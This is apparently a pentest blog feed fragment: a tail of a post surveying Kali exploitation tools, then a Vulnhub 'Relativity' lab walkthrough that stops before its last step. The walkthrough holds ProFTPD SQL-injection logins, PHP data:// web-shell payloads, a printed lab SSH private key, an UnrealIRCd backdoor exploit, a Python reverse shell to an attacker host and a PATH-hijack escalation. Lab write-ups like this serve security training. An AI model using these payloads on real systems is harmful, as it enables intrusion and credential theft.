<p>Amid growing concerns about web-borne attacks against clients, including mobile clients, BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. Unlike other security frameworks, BeEF looks past the hardened network perimeter and client system, and examines exploitability within the context of the one open door: the web browser. BeEF will hook one or more web browsers and use them as beachheads for launching directed command modules and further attacks against the system from within the browser context.</p>

<!-- more -->


<p><img class="center" src="/images/kali/exploit/beef.png" title="&lsquo;beef&rsquo; &lsquo;beef&rsquo;" ></p>

<h3>Exploit Database</h3>

<p><strong>searchsploit</strong></p>

<p>Exploit Database Archive Search</p>

<p>``` plain
Usage: searchsploit [options] term1 [term2] &hellip; [termN]
Example: searchsploit oracle windows local</p>

<p>=========</p>

<h1> Options </h1>

<p>   -c            Perform case-sensitive searches; by default, searches will</p>

<pre><code>             try to be greedy
</code></pre>

<p>   -h, &mdash;help    Show help screen
   -v            By setting verbose output, description lines are allowed to</p>

<pre><code>             overflow their columns
</code></pre>

<p>=======</p>

<h1> NOTES </h1>

<ul>
<li>Use any number of search terms you would like (minimum: 1)</li>
<li>Search terms are not case sensitive, and order is irrelevant
```</li>
</ul>


<h3>Exploit Development Tools</h3>

<p><strong>edb-debugger</strong></p>

<p>A Linux equivalent of the famous Olly debugger on the Windows platform. Some of its features are:</p>

<ul>
<li><p>Intuitive GUI interface</p></li>
<li><p>The usual debugging operations (step-into/step-over/run/break)</p></li>
<li><p>Conditional breakpoints</p></li>
<li><p>Debugging core is implemented as a plugin so people can have drop in replacements. Of course if a given platform has several debugging APIs available, then you may have a plugin that implements any of them.</p></li>
<li><p>Basic instruction analysis</p></li>
<li><p>View/Dump memory regions</p></li>
<li><p>Effective address inspection</p></li>
<li><p>The data dump view is tabbed, allowing you to have several views of memory open at the same time and quickly switch between them.</p></li>
<li><p>Importing and generation of symbol maps</p></li>
<li><p>Plugins</p></li>
</ul>


<p><img class="center" src="/images/kali/exploit/edb.png" title="&lsquo;edb-debugger&rsquo; &lsquo;edb&rsquo;" ></p>

<p><strong>NASM shell</strong></p>

<p>This tool provides an easy way to see what opcodes are associated with
certain x86 instructions by making use of nasm if it is installed and
reachable through the PATH environment variable.</p>

<p><strong>ollydbg</strong></p>

<p>OllyDbg is a 32-bit assembler level analysing debugger for Microsoft Windows. Emphasis on binary code analysis makes it particularly useful in cases where source is unavailable.</p>

<p>Features:</p>

<ul>
<li><p>Intuitive user interface, no cryptical commands</p></li>
<li><p>Code analysis â traces registers, recognizes procedures, loops, API calls, switches, tables, constants and strings</p></li>
<li><p>Directly loads and debugs DLLs</p></li>
<li><p>Object file scanning â locates routines from object files and libraries</p></li>
<li><p>Allows for user-defined labels, comments and function descriptions</p></li>
<li><p>Understands debugging information in BorlandÂ® format</p></li>
<li><p>Saves patches between sessions, writes them back to executable file and updates fixups</p></li>
<li><p>Open architecture â many third-party plugins are available</p></li>
<li><p>No installation â no trash in registry or system directories</p></li>
<li><p>Debugs multithread applications</p></li>
<li><p>Attaches to running programs</p></li>
<li><p>Configurable disassembler, supports both MASM and IDEAL formats</p></li>
<li><p>MMX, 3DNow! and SSE data types and instructions, including Athlon extensions</p></li>
<li><p>Full UNICODE support</p></li>
<li><p>Dynamically recognizes ASCII and UNICODE strings â also in Delphi format!</p></li>
<li><p>Recognizes complex code constructs, like call to jump to procedure</p></li>
<li><p>Decodes calls to more than 1900 standard API and 400 C functions</p></li>
<li><p>Gives context-sensitive help on API functions from external help file</p></li>
<li><p>Sets conditional, logging, memory and hardware breakpoints</p></li>
<li><p>Traces program execution, logs arguments of known functions</p></li>
<li><p>Shows fixups</p></li>
<li><p>Dynamically traces stack frames</p></li>
<li><p>Searches for imprecise commands and masked binary sequences</p></li>
<li><p>Searches whole allocated memory</p></li>
<li><p>Finds references to constant or address range</p></li>
<li><p>Examines and modifies memory, sets breakpoints and pauses program on-the-fly</p></li>
<li><p>Assembles commands into the shortest binary form</p></li>
<li><p>Starts from the floppy disk</p></li>
</ul>


<p><img class="center" src="/images/kali/exploit/ollydbg.png" title="&lsquo;ollydbg&rsquo; &lsquo;ollydbg&rsquo;" ></p>

<p><strong>pattern create</strong></p>

<p>Generate a string composed of unique patterns</p>

<p><code>plain
root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 25
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7A
</code></p>

<p><strong>pattern offset</strong></p>

<p>Find the offset in an exploit string where your address to overwrite EIP should be</p>

<p><code>plain
Usage: pattern_offset.rb &lt;search item&gt; &lt;length of buffer&gt;
Default length of buffer if none is inserted: 8192
This buffer is generated by pattern_create() in the Rex library automatically
</code></p>

<h3>Metasploit</h3>

<p>World&rsquo;s most used penetration testing software&hellip;the hacker&rsquo;s best friend. No further description needed</p>

<p>``` plain
root@kali:~# msfconsole
[*] Starting the Metasploit Framework console&hellip;|
Call trans opt: received. 2-19-98 13:24:18 REC:Loc</p>

<pre><code> Trace program: running

       wake up, Neo...
    the matrix has you
  follow the white rabbit.

      knock, knock, Neo.

                    (`.         ,-,
                    ` `.    ,;' /
                     `.  ,'/ .'
                      `. X /.'
            .-;--''--.._` ` (
          .'            /   `
         ,           ` '   Q '
         ,         ,   `._    \
      ,.|         '     `-.;_'
      :  . `  ;    `  ` --,.._;
       ' `    ,   )   .'
          `._ ,  '   /_
             ; ,''-,;' ``-
              ``-..__``--`

                         http://metasploit.pro
</code></pre>

<p>Validate lots of vulnerabilities to demonstrate exposure
with Metasploit Pro &mdash; Learn more on <a href="http://rapid7.com/metasploit">http://rapid7.com/metasploit</a></p>

<pre><code>   =[ metasploit v4.11.0-2015013101 [core:4.11.0.pre.2015013101 api:1.0.0]]
</code></pre>

<ul>
<li>&mdash; &mdash;=[ 1399 exploits &ndash; 788 auxiliary &ndash; 224 post        ]</li>
<li>&mdash; &mdash;=[ 356 payloads &ndash; 37 encoders &ndash; 8 nops             ]</li>
<li>&mdash; &mdash;=[ Free Metasploit Pro trial: <a href="http://r-7.co/trymsp">http://r-7.co/trymsp</a> ]</li>
</ul>


<p>msf >
```</p>

<h3>Network Exploitation</h3>

<p><strong>armitage</strong></p>

<p>Armitage is a scriptable red team collaboration tool for Metasploit that visualizes targets, recommends exploits, and exposes the advanced post-exploitation features in the framework.</p>

<p>Through one Metasploit instance, your team will:</p>

<ul>
<li><p>Use the same sessions</p></li>
<li><p>Share hosts, captured data, and downloaded files</p></li>
<li><p>Communicate through a shared event log.</p></li>
<li><p>Run bots to automate red team tasks.</p></li>
</ul>


<p>Armitage organizes Metasploit&rsquo;s capabilities around the hacking process. There are features for discovery, access, post-exploitation, and maneuver.</p>

<p><img class="center" src="/images/kali/exploit/armitage.png" title="&lsquo;armitage&rsquo; &lsquo;armitage&rsquo;" ></p>

<p><strong>exploit6</strong></p>

<p>Performs exploits of various CVE known IPv6 vulnerabilities on the destination</p>

<p>``` plain
exploit6 v2.5 &copy; 2013 by van Hauser / THC <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#118;&#x68;&#x40;&#116;&#x68;&#x63;&#x2e;&#111;&#114;&#x67;">&#118;&#x68;&#64;&#x74;&#104;&#99;&#x2e;&#111;&#114;&#x67;</a> www.thc.org</p>

<p>Syntax: exploit6 interface destination [test-case-number]</p>

<p>Performs exploits of various CVE known IPv6 vulnerabilities on the destination
Note that for exploitable overflows only &lsquo;AAA&hellip;&rsquo; strings are used.
If a system is vulnerable, it will crash, so be careful!
```</p>

<p><strong>ikat</strong></p>

<p>iKAT is designed to provide access to the underlying operating system of a Kiosk terminal by invoking native OS functionality.</p>

<p><strong>jboss-autopwn</strong></p>

<p>This JBoss script deploys a JSP shell on the target JBoss AS server. Once deployed, the script uses its upload and command execution capability to provide an interactive session.</p>

<p>Features include:</p>

<ul>
<li><p>Multiplatform support â tested on Windows, Linux and Mac targets</p></li>
<li><p>Support for bind and reverse bind shells</p></li>
<li><p>Meterpreter shells and VNC support for Windows targets</p></li>
</ul>


<p><a href="https://github.com/SpiderLabs/jboss-autopwn">Example from the homepage</a>:</p>

<p>``` plain
Linux bind shell:</p>

<p>[root@nitrogen jboss]# ./e.sh 192.168.1.2 8080 2>/dev/null
[x] Retrieving cookie
[x] Now creating BSH script&hellip;
[x] .war file created successfully in /tmp
[x] Now deploying .war file:
<a href="http://192.168.1.2:8080/browser/browser/browser.jsp">http://192.168.1.2:8080/browser/browser/browser.jsp</a>
[x] Running as user&hellip;:
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[x] Server uname&hellip;:
 Linux nitrogen 2.6.29.6-213.fc11.x86_64 #1 SMP Tue Jul 7 21:02:57 EDT 2009 x86_64 x86_64 x86_64 GNU/Linux
[!] Would you like to upload a reverse or a bind shell? bind
[!] On which port would you like the bindshell to listen on? 31337
[x] Uploading bind shell payload..
[x] Verifying if upload was successful&hellip;
-rwxrwxrwx 1 root root 172 2009-11-22 19:48 /tmp/payload
[x] You should have a bind shell on 192.168.1.2:31337..
[x] Dropping you into a shell&hellip;
Connection to 192.168.1.2 31337 port [tcp/*] succeeded!
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
[root@nitrogen /]# full interactive shell :&ndash;)
```</p>

<p><strong>termineter</strong></p>

<p>Termineter is a framework written in python to provide a platform for the security testing of smart meters. It implements the C12.18 and C12.19 protocols for communication. Currently supported are Meters using C12.19 with 7-bit character sets. Termineter communicates with Smart Meters via a connection using an ANSI type-2 optical probe with a serial interface.</p>

<p>``` plain
root@kali:~# termineter</p>

<hr />

<p>  /<em>  <strong>/</strong> </em><strong><strong><em> _  (</em>)</strong>  </strong><em> / /</em><em><strong> </strong>__
   / / / &ndash;</em>) <strong>/  &lsquo; \/ / _ \/ &ndash;_) </strong>/ &ndash;<em>) __/
  /</em>/  _<em>/</em>/ /<em>/</em>/<em>/</em>/<em>//</em>/_<em>/_</em>/_<em>/</em>/</p>

<p>  &lt;[ termineter                     v0.1.0
  &lt;[ model:                          T-800
  &lt;[ loaded modules:                    12</p>

<p>termineter > show modules</p>

<h1>Modules</h1>

<p>  Name               Description</p>

<hr />

<p>  brute_force_login  Brute Force Credentials
  dump_tables        Dump Readable C12.19 Tables From The Device To A CSV File
  enum_tables        Enumerate Readable C12.19 Tables From The Device
  get_info           Get Basic Meter Information By Reading Tables
  get_log_info       Get Information About The Meter&rsquo;s Logs
  get_modem_info     Get Information About The Integrated Modem
  get_security_info  Get Information About The Meter&rsquo;s Access Control
  read_table         Read Data From A C12.19 Table
  run_procedure      Initiate A Custom Procedure
  set_meter_id       Set The Meter&rsquo;s I.D.
  set_meter_mode     Change the Meter&rsquo;s Operating Mode
  write_table        Write Data To A C12.19 Table</p>

<p>termineter >
```</p>

<h3>Social Engineering Toolkit</h3>

<p>The Social-Engineer Toolkit is an open-source penetration testing framework designed for Social-Engineering. SET has a number of custom attack vectors that allow you to make a believable attack in a fraction of the time.</p>

<p>``` plain</p>

<pre><code>      _______________________________
     /   _____/\_   _____/\__    ___/
     \_____  \  |    __)_   |    |
     /        \ |        \  |    |
    /_______  //_______  /  |____|
            \/         \/            
</code></pre>

<p>[&mdash;&ndash;]        The Social-Engineer Toolkit (SET)         [&mdash;&ndash;]
[&mdash;&ndash;]        Created by: David Kennedy (ReL1K)         [&mdash;&ndash;]
[&mdash;&ndash;]                  Version: 6.3                    [&mdash;&ndash;]
[&mdash;&ndash;]              Codename: &lsquo;#HugLife&rsquo;                [&mdash;&ndash;]
[&mdash;&ndash;]        Follow us on Twitter: @TrustedSec         [&mdash;&ndash;]
[&mdash;&ndash;]        Follow me on Twitter: @HackingDave        [&mdash;&ndash;]
[&mdash;&ndash;]       Homepage: <a href="https://www.trustedsec.com">https://www.trustedsec.com</a>       [&mdash;&ndash;]</p>

<pre><code>    Welcome to the Social-Engineer Toolkit (SET). 
     The one stop shop for all of your SE needs.

 Join us on irc.freenode.net in channel #setoolkit
</code></pre>

<p>   The Social-Engineer Toolkit is a product of TrustedSec.</p>

<pre><code>         Visit: https://www.trustedsec.com
</code></pre>

<p> Select from the menu:</p>

<p>   1) Social-Engineering Attacks
   2) Fast-Track Penetration Testing
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About</p>

<p>  99) Exit the Social-Engineer Toolkit</p>

<p>set>
```</p>

<p><img class="center" src="/images/kali/exploit/cookie.png" title="&lsquo;cookie&rsquo; &lsquo;cookie&rsquo;" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Relativity]]></title>
    <link href="http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity/"/>
    <updated>2015-05-10T09:40:50-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity</id>
    <content type="html"><![CDATA[<p>I selected the Relativity VM from Vulnhub as my next home lab target. The objective is to read <code>/root/flag.txt</code>. Let&rsquo;s get started!</p>

<!-- more -->


<p>``` plain
 nmap -A -p1-65535 192.168.80.128</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-05-10 16:46 EEST
Nmap scan report for 192.168.80.128
Host is up (0.00058s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp
22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
| ssh-hostkey:
|   1024 42:d0:50:45:6c:4f:6a:25:d9:5e:d4:7d:12:26:04:ef (DSA)
|<em>  2048 1b:e9:72:2b:8a:0b:57:0a:4b:ad:3d:06:62:94:29:02 (RSA)
80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
|</em>http-title: M.C. Escher &ndash; Relativity
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
SF-Port21-TCP:V=6.47%I=7%D=5/10%Time=554F618E%P=x86_64-unknown-linux-gnu%r
SF:(GenericLines,29,&ldquo;220\x20Welcome\x20to\x20Relativity\x20FTP\x20(mod_sq
SF:l)\r\n&rdquo;);
MAC Address: 00:0C:29:9F:1D:0E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 &ndash; 3.10
Network Distance: 1 hop
Service Info: Host: Relativity
```</p>

<p>The web server doesn&rsquo;t seem to serve anything else than an image. I ran Nikto and Dirbuster on it but didn&rsquo;t find anything. Next I hit the FTP server. No anonymous login possible, but there was something interesting in the banner:</p>

<p><code>plain
220 Welcome to Relativity FTP (mod_sql)
</code></p>

<p>I started googling, and it turns out that <a href="http://www.proftpd.org/docs/contrib/mod_sql.html">&ldquo;The mod_sql module is an authentication and logging module for ProFTPD&rdquo;</a>. The good news is, <a href="https://www.rapid7.com/db/vulnerabilities/ftp-proftpd-sql-injection">there is a SQLi vulnerability</a> in the USER command that might allow access to the server. I don&rsquo;t know the version of our target server, but let&rsquo;s try it!</p>

<p>On <a href="http://www.securityfocus.com/bid/33722/exploit">http://www.securityfocus.com/bid/33722/exploit</a> you can find some sample exploit strings:</p>

<p>``` plain
username: %&lsquo;) and 1=2 union select 1,1,uid,gid,homedir,shell from users; &mdash;
password: 1</p>

<p>username: %&lsquo;) and 1=2 union (select &lt;name&gt;,1,&lt;uid&gt;,&lt;gid&gt;,0x2F,0x2F62696E2F62617368); &mdash; a
```</p>

<p>Neither worked, but I tinkered with the comment characters and found out that I could get in either by replacing the <em>&mdash;</em> with a <em>#</em>, or by inserting a space and random characters after the <em>&mdash;</em>:</p>

<p><code>plain
220 Welcome to Relativity FTP (mod_sql)
Name (192.168.80.128:root): username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; #
331 Password required for username:.
Password:
230 User username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
</code></p>

<p>Next, I found out an interesting looking directory:</p>

<p><code>plain
ftp&gt; pwd
257 "/" is current directory.
ftp&gt; dir
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
226 Transfer complete.
</code></p>

<p>It seems we are in the root directory, but the html and image file hint at the web server. So I went to the website again and this time I tried to navigate to that new directory:</p>

<p><img class="center" src="/images/pentest/relativity/secretdir.png" title="&lsquo;secretdir&rsquo; &lsquo;secretdir&rsquo;" ></p>

<p>I looked around at the pages, noticed the URL when accessing them looks something like this: <code><a href="http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php">http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php</a></code>. So I tried some local file inclusion, but it didn&rsquo;t get me anywhere. To get to the next step, I needed some external reading and inspiration. For the exploit, we can leverage PHP&rsquo;s <a href="http://php.net/manual/en/wrappers.php">stream wrappers</a>: PHP comes with many built-in wrappers for various URL-style protocols for use with the filesystem functions such as fopen(), copy(), file_exists() and filesize(). On <a href="https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/">this blog post</a> there is a nice explanation and examples of how to get remote code execution by leveraging the <a href="http://php.net/manual/en/wrappers.data.php">data stream</a>. If you look at the examples, you can see that the content passed as a base64 string is being interpreted.
Check page 9 of <a href="https://www.imperva.com/docs/HII_Remote_and_Local_File_Inclusion_Vulnerabilities.pdf">this pdf</a> for a summary of this remote file inclusion technique. Bottom line: we can base64 encode PHP commands and feed them to the target. So to test this out:</p>

<p>``` plain</p>

<h1>simple RFI</h1>

<p>page=data://text/plain, &lt;?php system(&ldquo;whoami&rdquo;);?></p>

<h1>base64 encoded RFI</h1>

<p>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTs/Pg==</p>

<h1>mini shell</h1>

<p>page=data://text/plain,&lt;?php system($_GET[cmd]);?>&amp;cmd=id</p>

<h1>base64 + URL encoded mini shell (didn&rsquo;t work without URL encoding)</h1>

<p>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&amp;cmd=id
```</p>

<p>And we are free to enumerate! Next thing I did was to read <em>/etc/passwd</em> (look at it in the source code of the page for better readability). This gave me the name of 2 users on the machine:</p>

<h2>``` plain</h2>

<p>mauk:x:1001:1001::/home/mauk:/bin/bash
jetta:x:1002:1002::/home/jetta:/bin/bash
```</p>

<p>Next I looked around some more, and when listing the home directories, I noticed that mauk&rsquo;s home folder permissions aren&rsquo;t what they should be (but good for us!):</p>

<p><code>plain
drwx------. 3 jetta jetta 4096 Jul  9  2013 jetta
drwxr-xr-x. 3 mauk  mauk  4096 Jul  9  2013 mauk
</code></p>

<p>Looking in mauk&rsquo;s directory, this is interesting:</p>

<p><code>
drwxr-xr-x. 2 mauk mauk 4096 Jul  9  2013 .ssh
</code></p>

<p>Even better, inside there is mauk&rsquo;s private SSH key!</p>

<p>``` plain
-rw-r&mdash;r&mdash;. 1 mauk mauk 1679 Feb 24  2013 id_rsa</p>

<p>```</p>

<p>And we can read it:</p>

<p><code>plain
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
-----END RSA PRIVATE KEY-----
</code></p>

<p>We can save this private key on our machine and use it to log in as mauk! After looking around without any major discoveries, I noticed this folder in <em>/opt/</em>:</p>

<p><code>plain
[mauk@Relativity ~]$ ls -l /opt
total 4
drwx------ 13 jetta jetta 4096 May 20 18:32 Unreal
</code></p>

<p>That means there is an Unreal IRCd server there! But I didn&rsquo;t find one when port scanning. Looking at the listening programs, there is indeed an IRC server listening on localhost on port 6667:</p>

<p><code>plain
[mauk@Relativity ~]$ netstat -lntp
(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -                   
...
</code></p>

<p>The ircd server might be an avenue for privilege escalation to jetta:</p>

<p><code>plain
[mauk@Relativity ~]$ ps -u jetta
  PID TTY          TIME CMD
  557 ?        00:00:00 ircd
</code></p>

<p>But there was no netcat installed on the machine, so to find some information about the irc server, I set up SSH port forwarding so I can access it from my machine:</p>

<p><code>plain
root@kali:~# ssh -L 4444:127.0.0.1:6667 mauk@192.168.80.128
Last login: Sat May 23 18:25:04 2015 from 192.168.80.130
[mauk@Relativity ~]$
</code></p>

<p>And now I could port scan my local 4444 port to learn more:</p>

<p>``` plain
root@kali:~# nmap -A -sV 127.0.0.1 4444</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-05-23 16:31 EEST
setup_target: failed to determine route to 4444 (0.0.17.92)
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000065s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
4444/tcp open  irc     Unreal ircd
| irc-info:
|   server: relativity.localdomain
|   version: Unreal3.2.8.1. relativity.localdomain
|   servers: 1
|   users: 1
|   lservers: 0
|   lusers: 1
|   uptime: 0 days, 0:51:08
|   source host: rox-D2735CD4
|_  source ident: nmap
```</p>

<p>I googled the version and it contains a backdoor, and there is a Metasploit module for it. I fired up Metasploit and used against my localhost and port (remember the port forwarding), and got a shell as jetta! But if you want to know more about the backdoor and how to exploit it manually, read <a href="http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">this</a>.</p>

<p>``` plain
msf exploit(unreal_ircd_3281_backdoor) > run</p>

<p>[<em>] Started reverse handler on 192.168.80.130:5555
[</em>] Connected to 127.0.0.1:4444&hellip;</p>

<pre><code>:relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
</code></pre>

<p>[<em>] Sending backdoor command&hellip;
[</em>] Command shell session 1 opened (192.168.80.130:5555 &ndash;> 192.168.80.128:41061) at 2015-05-23 17:18:12 +0300</p>

<p>whoami
jetta
```</p>

<p>In jetta&rsquo;s home directory there is a directory named <code>auth_server</code> with a binary inside. I ran <em>strings</em> on it:</p>

<p><code>plain
strings /home/jetta/auth_server/auth_server
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
fflush
puts
putchar
printf
poll
stdout
system
__libc_start_main
GLIBC_2.2.5
l$ L
t$(L
|$0H
[+] Checking Certificates...
done
[+] Contacting server, please wait...
could not establish connection
invalid certificates
error: (12)
fortune -s | /usr/bin/cowsay
Starting Auth server..
;*3$"
</code></p>

<p>Interesting. This binary also appears to be owned as root:</p>

<p><code>plain
ls -l /home/jetta/auth_server/auth_server
-rwxr-xr-x 1 root root 8010 Mar  8  2013 /home/jetta/auth_server/auth_server
</code></p>

<p>I tried to <em>sudo -l</em> to see if jetta can run any commands as root, but there was no output in my shell. So I checked if the shell I have is interactive using <a href="http://unix.stackexchange.com/questions/26676/how-to-check-if-a-shell-is-login-interactive-batch">this SO post</a>:</p>

<p><code>plain
[[ $- == *i* ]] &amp;&amp; echo 'Interactive' || echo 'Not interactive'
Not interactive
</code></p>

<p>I then read <a href="http://netsec.ws/?p=337">this post</a> about spawning a TTY shell and used the first of the choices for a proper shell:</p>

<p>``` plain
python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
sh-4.2$ sudo -l
sudo -l
Matching Defaults entries for jetta on this host:</p>

<pre><code>requiretty, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
XAUTHORITY PATH", env_reset
</code></pre>

<p>User jetta may run the following commands on this host:</p>

<pre><code>(root) NOPASSWD: /home/jetta/auth_server/auth_server
</code></pre>

<p>```</p>

<p>Excellent, so the key to getting root is in exploiting that binary we found earlier. I ran it to see what it does:</p>

<p>``` plain
sh-4.2$ /home/jetta/auth_server/auth_server
/home/jetta/auth_server/auth_server
[+] Checking Certificates&hellip;done
[+] Contacting server, please wait&hellip;could not establish connection
error: (12)</p>

<hr />

<p>&lt; There isn&rsquo;t any problem ></p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>

<p>I ran it several times for fun, made a mental note to replace my fortune cookies at the end of the blog posts with cowsay fortune cookies because this is purely awesome, then looked at <em>strings</em> again. Looking at the line <code>fortune -s | /usr/bin/cowsay</code>, we see that the <em>fortune</em> command doesn&rsquo;t use an absolute path. So we can create a program of our choosing called fortune and modify our PATH variable to start looking in the location of our program. At this point I tried several ways to get a local or reverse root shell but I kept getting errors that the fortune file is busy, so instead of running the exploit every time and then getting a TTY shell on top of it, I thought maybe I can log in directly as jetta now and work from there. So I made a <code>.ssh</code> directory inside jetta&rsquo;s home folder and copied there mauk&rsquo;s <code>authorized_keys</code> file (remember the permissions were too lax). So now I could directly ssh as jetta and try again for the shell.</p>

<p>This time I used a <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Python reverse shell</a>:</p>

<p><code>plain
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.80.130",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</code>
I updated it with my host address and port, put it in a file named fortune, gave it permissions and updated  the  path to start looking in <em>/tmp/</em>:</p>

<p>``` plain</p>

<p>[jetta@Relativity ~]$ chmod 777 /tmp/fortune</p>

<p>[jetta@Relativity ~]$ export PATH=&ldquo;/tmp:$PATH&rdquo;</p>

<p>[jetta@Relativity ~]$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/jetta/.local/bin:/home/jetta/bin
```</p>

<p>On my machine I had netcat listen for connections:</p>

<p><code>plain
root@kali:~# nc -vnlp 5555
nc: listening on :: 5555 ...
nc: listening on 0.0.0.0 5555 ...
</code></p>

<p>And now I ran <code>auth_server</code> again:</p>

